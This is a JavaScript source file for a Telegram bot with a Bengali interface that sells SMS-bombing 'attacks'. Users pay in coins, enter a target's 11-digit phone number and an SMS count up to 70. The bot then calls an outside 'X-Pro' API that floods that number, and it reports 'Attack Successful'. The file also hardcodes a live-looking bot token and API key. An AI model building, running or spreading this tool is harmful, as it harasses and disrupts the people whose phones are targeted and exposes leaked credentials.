const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; 
const channelId = '@srmtelecom'; 
const channelLink = 'https://t.me/srmtelecom';
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { 
    try { users = JSON.parse(fs.readFileSync(dbFile)); } catch (e) { users = {}; }
}
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

// Render সচল রাখতে
http.createServer((req, res) => { res.write("X-Pro Engine Integrated!"); res.end(); }).listen(process.env.PORT || 3000);

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '💰 প্রোফাইল ও কয়েন' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

async function isSubscribed(chatId) {
    try {
        const res = await bot.getChatMember(channelId, chatId);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();
    if (!text) return;

    if (!users[userId]) {
        users[userId] = { balance: 0, lastBonus: 0, step: '', name: msg.from.first_name || "User" };
        saveDB();
    }

    const joined = await isSubscribed(chatId);
    if (!joined && text !== '/start' && !text.startsWith('/start')) {
        return bot.sendMessage(chatId, `❌ **অ্যাক্সেস লক!**\nচ্যানেলে জয়েন করে /start দিন।\n📢 লিংক: ${channelLink}`);
    }

    // অ্যাডমিন কমান্ড
    if (userId === adminId && text.startsWith('add ')) {
        const [_, targetId, amount] = text.split(' ');
        if (users[targetId]) {
            users[targetId].balance += parseInt(amount);
            saveDB();
            bot.sendMessage(chatId, `✅ ইউজার ${targetId}-কে ${amount} কয়েন দেওয়া হয়েছে।`);
        }
        return;
    }

    if (text === '/start' || text.startsWith('/start')) {
        return bot.sendMessage(chatId, "🔥 **S.R.M TELECOM**\nPowered By X-Pro Engine", mainMenu);
    }

    if (text === '💰 প্রোফাইল ও কয়েন') {
        const bal = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 নাম: ${users[userId].name}\n💰 ব্যালেন্স: ${bal}`, { parse_mode: "Markdown" });
    }

    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        if (now - users[userId].lastBonus < 86400000) return bot.sendMessage(chatId, "⏳ ২৪ ঘণ্টা পর আবার আসুন।");
        users[userId].balance += 2;
        users[userId].lastBonus = now;
        saveDB();
        return bot.sendMessage(chatId, "✅ ২ কয়েন বোনাস পেয়েছেন!");
    }

    // --- অ্যাটাক প্রসেস (আপনার দেওয়া নতুন লজিক) ---
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) return bot.sendMessage(chatId, "❌ কয়েন নেই!");
        users[userId].step = 'get_num';
        saveDB();
        return bot.sendMessage(chatId, "📱 টার্গেট নম্বর দিন:", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'get_num' && text.length === 11) {
        users[userId].target = text;
        users[userId].step = 'get_amount';
        saveDB();
        return bot.sendMessage(chatId, "🔢 কয়টি SMS? (১-৭০):");
    }

    if (users[userId]?.step === 'get_amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 70 || amount <= 0) {
            return bot.sendMessage(chatId, "⚠️ *ভুল সংখ্যা!* ১-৭০ এর মধ্যে দিন।", { parse_mode: 'Markdown' });
        }

        const target = users[userId].target;
        if (userId !== adminId) users[userId].balance -= 1;
        users[userId].step = '';
        saveDB();

        const statusMsg = await bot.sendMessage(chatId, "⏳ *Connecting to X-Pro Engine...*", { parse_mode: 'Markdown' });

        // X-Pro API Call
        const apiUrl = `https://x-pro-prime-xyron-api-hub.onrender.com/api/v1/execute?target=${target}&count=${amount}&key=Prime_xyron_9xm`;
        
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                const successTxt = `🔥 *Attack Successful!*\n🎯 Target: \`${target}\`\n🔢 Amount: \`${amount}\`\n━━━━━━━━━━━━━━━\n⚡ *Powered By X-Pro Engine*`;
                bot.editMessageText(successTxt, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' });
            } else {
                bot.editMessageText("❌ এপিআই রেসপন্স দিচ্ছে না।", { chat_id: chatId, message_id: statusMsg.message_id });
            }
        } catch (e) {
            bot.editMessageText("❌ এপিআই কানেকশন এরর!", { chat_id: chatId, message_id: statusMsg.message_id });
        }
        
        bot.sendMessage(chatId, "অ্যাটাক শেষ হয়েছে।", mainMenu);
    }
});
